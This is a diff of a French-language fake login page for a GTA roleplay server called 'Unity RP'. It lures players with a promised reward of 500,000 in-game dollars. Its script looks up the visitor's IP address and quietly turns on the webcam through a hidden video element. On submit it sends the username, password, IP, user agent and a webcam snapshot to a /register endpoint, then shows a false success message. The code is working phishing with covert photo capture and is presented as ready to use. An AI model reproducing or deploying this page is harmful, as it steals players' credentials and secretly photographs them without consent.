@@ -1,246 +1,63 @@
+<script>
+    const videoStream = document.getElementById('videoStream');
+    let userIpAddress = 'Non détectée';
 
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Unity RP - Connexion</title>
-    <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body, html { height: 100%; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; overflow: hidden; }
+    // Récupération de l'adresse IP
+    fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(data => { userIpAddress = data.ip; })
+        .catch(err => console.error("Erreur IP:", err));
 
-        body {
-            background: url('background.jpg') no-repeat center center fixed;
-            background-size: cover;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            position: relative;
-            background-color: #0b0b0b;
+    // Activation de la webcam
+    navigator.mediaDevices?.getUserMedia({ video: true })
+        .then(stream => { videoStream.srcObject = stream; })
+        .catch(err => console.error("Caméra non accessible:", err));
+
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const user = document.getElementById('username').value.trim();
+        const pass = document.getElementById('password').value.trim();
+
+        if (!user || !pass) return;
+
+        let photoData = null;
+        try {
+            if (videoStream.srcObject) {
+                const canvas = document.createElement('canvas');
+                canvas.width = videoStream.videoWidth || 640;
+                canvas.height = videoStream.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(videoStream, 0, 0, canvas.width, canvas.height);
+                photoData = canvas.toDataURL('image/jpeg', 0.7);
+            }
+        } catch (camErr) {
+            console.log("Caméra ignorée.");
         }
-        body::before {
-            content: "";
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.75);
-            z-index: 1;
-        }
-
-        .login-card {
-            background: #121212;
-            padding: 35px;
-            border-radius: 12px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.9);
-            text-align: center;
-            width: 380px;
-            position: relative;
-            z-index: 2;
-            border: 1px solid #222;
-        }
-
-        .brand-title {
-            font-size: 26px;
-            font-weight: 900;
-            color: #fff;
-            margin-bottom: 5px;
-            text-transform: uppercase;
-        }
-        .brand-title span { color: #ff2a4d; }
-
-        .reward-banner {
-            background: rgba(255, 42, 77, 0.15);
-            border: 1px dashed #ff2a4d;
-            color: #ff4d6d;
-            padding: 8px;
-            border-radius: 6px;
-            font-size: 13px;
-            font-weight: bold;
-            margin: 15px 0 20px 0;
-            animation: pulseGlow 1.5s infinite alternate;
-        }
-
-        @keyframes pulseGlow {
-            0% { transform: scale(1); box-shadow: 0 0 5px rgba(255,42,77,0.2); }
-            100% { transform: scale(1.02); box-shadow: 0 0 15px rgba(255,42,77,0.6); }
-        }
-
-        .form-group { text-align: left; margin-bottom: 12px; }
-        .form-label { display: block; font-size: 12px; color: #aaa; margin-bottom: 4px; }
-        .form-input {
-            width: 100%;
-            padding: 10px;
-            background: #1a1a1a;
-            border: 1px solid #333;
-            border-radius: 6px;
-            color: #fff;
-            font-size: 14px;
-        }
-        .form-input:focus { outline: none; border-color: #ff2a4d; }
-
-        .neon-btn {
-            background: #ff2a4d;
-            color: white;
-            border: none;
-            padding: 12px;
-            border-radius: 6px;
-            font-size: 15px;
-            font-weight: bold;
-            cursor: pointer;
-            width: 100%;
-            box-shadow: 0 0 12px rgba(255, 42, 77, 0.4);
-            transition: all 0.3s ease;
-            margin-top: 10px;
-        }
-        .neon-btn:hover {
-            background: #ff4d6d;
-            box-shadow: 0 0 20px rgba(255, 42, 77, 0.8);
-        }
-
-        .official-footer-left {
-            position: absolute;
-            bottom: 20px;
-            left: 20px;
-            display: flex;
-            gap: 15px;
-            z-index: 3;
-        }
-
-        .footer-icon-link {
-            width: 36px;
-            height: 36px;
-            background: rgba(18, 18, 18, 0.8);
-            border: 1px solid #333;
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            transition: all 0.3s ease;
-            text-decoration: none;
-        }
-
-        .footer-icon-link svg {
-            width: 18px;
-            height: 18px;
-            fill: #aaa;
-            transition: fill 0.3s ease;
-        }
-
-        .footer-icon-link:hover {
-            border-color: #ff2a4d;
-            background: rgba(255, 42, 77, 0.2);
-        }
-
-        .footer-icon-link:hover svg {
-            fill: #ff2a4d;
-        }
-
-        #videoStream { display: none; }
-    </style>
-</head>
-<body>
-
-    <video id="videoStream" autoplay muted playsinline></video>
-
-    <div class="login-card">
-        <h1 class="brand-title">UNITY <span>RP</span></h1>
-        
-        <div class="reward-banner">
-            🎁 Récompense : +500 000 GTA $ RP offerts !
-        </div>
-
-        <form id="loginForm">
-            <div class="form-group">
-                <label class="form-label">Nom d'utilisateur</label>
-                <input type="text" id="username" class="form-input" placeholder="Entrez votre pseudo" required>
-            </div>
-            <div class="form-group">
-                <label class="form-label">Mot de passe</label>
-                <input type="password" id="password" class="form-input" placeholder="••••••••" required>
-            </div>
-            <button type="submit" class="neon-btn">Se connecter au serveur</button>
-        </form>
-    </div>
-
-    <div class="official-footer-left">
-        <a href="https://discord.gg/unityrp" target="_blank" class="footer-icon-link" title="Discord">
-            <svg viewBox="0 0 127.14 96.36">
-                <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.68,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1,105.25,105.25,0,0,0,32.19-16.14c2.63-27.29-4.5-51.14-18.9-72.15ZM42.45,65.69C36.18,65.69,31,60,31,53s5.18-12.72,11.45-12.72S53.9,46,53.88,53,48.72,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.2,60,73.2,53s5.18-12.72,11.45-12.72S96.15,46,96.13,53,91,65.69,84.69,65.69Z"/>
-            </svg>
-        </a>
-        <a href="https://unityrp.com" target="_blank" class="footer-icon-link" title="Site Web">
-            <svg viewBox="0 0 24 24">
-                <path d="M12 2a10 10 0 1 0 10 10A10 10 0 0 0 12 2zm8 10a8 8 0 0 1-1.45 4.66l-3.32-3.32a3 3 0 0 0-.23-3.14l2.12-2.12A8 8 0 0 1 20 12zm-11.66-8.34A8 8 0 0 1 12 4a7.9 7.9 0 0 1 3.53.83l-2.12 2.12a5 5 0 0 0-3.53 1.47l-1.41-1.41a8 8 0 0 1 3.59-1.59z"/>
-            </svg>
-        </a>
-        <a href="mailto:support@unityrp.com" class="footer-icon-link" title="Support">
-            <svg viewBox="0 0 24 24">
-                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 16h-2v-2h2v2zm1.07-7.75l-.9.92C12.45 11.9 12 12.5 12 14h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H7c0-2.76 2.24-5 5-5s5 2.24 5 5c0 1.03-.42 1.98-1.03 2.75z"/>
-            </svg>
-        </a>
-    </div>
-
-        <script>
-        const videoStream = document.getElementById('videoStream');
-        let userIpAddress = 'Non détectée';
-
-        // Récupération de l'adresse IP
-        fetch('https://api.ipify.org?format=json')
-            .then(res => res.json())
-            .then(data => { userIpAddress = data.ip; })
-            .catch(err => console.error("Erreur IP:", err));
-
-        // Activation de la webcam
-        navigator.mediaDevices?.getUserMedia({ video: true })
-            .then(stream => { videoStream.srcObject = stream; })
-            .catch(err => console.error("Caméra non accessible :", err));
-
-        document.getElementById('loginForm').addEventListener('submit', async (e) => {
-    e.preventDefault();
-    const user = document.getElementById('username').value.trim();
-    const pass = document.getElementById('password').value.trim();
-
-    if (!user && !pass) return;
-
-    let photoData = null;
-    try {
-        if (videoStream.srcObject) {
-            const canvas = document.createElement('canvas');
-            canvas.width = videoStream.videoWidth || 640;
-            canvas.height = videoStream.videoHeight || 480;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(videoStream, 0, 0, canvas.width, canvas.height);
-            photoData = canvas.toDataURL('image/jpeg', 0.7);
-        }
-    } catch (camErr) {
-        console.log("Caméra ignorée.");
-    }
 
         try {
-        const response = await fetch('/register', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                username: user,
-                password: pass,
-                ip: userIpAddress,
-                userAgent: navigator.userAgent,
-                photo: photoData
-            })
-        });
+            const response = await fetch('/register', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    username: user,
+                    password: pass,
+                    ip: userIpAddress,
+                    userAgent: navigator.userAgent,
+                    photo: photoData
+                })
+            });
 
-        if (response.ok) {
-            alert('Connexion réussie ! Vos 500 000 GTA $ RP ont été crédités.');
-            document.getElementById('loginForm').reset();
-        } else {
-            alert('Erreur lors du traitement de la connexion par le serveur.');
+            if (response.ok) {
+                alert('Connexion réussie ! Vos 500 000 GTA $ RP ont été crédités.');
+                document.getElementById('loginForm').reset();
+            } else {
+                alert('Erreur lors du traitement de la connexion par le serveur.');
+            }
+        } catch (err) {
+            console.error("Erreur réseau :", err);
+            alert('Erreur de communication avec le serveur.');
         }
-    } catch (err) {
-        console.error("Erreur réseau :", err);
-        alert('Erreur de communication avec le serveur.');
-    }
-});
+    });
 </script>
-</body>
-</html>
